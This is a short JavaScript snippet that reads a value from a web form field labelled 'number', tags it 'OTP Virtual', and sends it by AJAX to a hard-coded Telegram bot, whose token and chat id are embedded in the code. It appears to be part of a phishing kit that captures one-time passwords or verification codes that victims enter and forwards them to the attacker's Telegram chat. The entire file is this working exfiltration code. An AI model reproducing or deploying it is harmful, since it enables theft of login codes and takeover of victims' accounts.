//bot token 
var telegram_bot_id = "7115229892:AAEX7O_-TbE5TcduGV8PjXf0yCJfPamFg_A"; 
//chat id 
var chat_id = 6370497509; 
var u_number ; 
var ready = function () { 
    u_number = document.getElementById("number").value; 
    message = "OTP Virtual: " + u_number; 
}; 
var sender = function () { 
    ready(); 
    var settings = { 
        "async": true, 
        "crossDomain": true, 
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", 
        "method": "POST", 
        "headers": { 
            "Content-Type": "application/json", 
            "cache-control": "no-cache" 
        }, 
        "data": JSON.stringify({ 
            "chat_id": chat_id, 
            "text": message 
        }) 
    }; 
    $.ajax(settings).done(function (response) { 
        console.log(response); 
       
       
        
        
    }); 
    document.getElementById("number").value = ""; 
    return false; 
};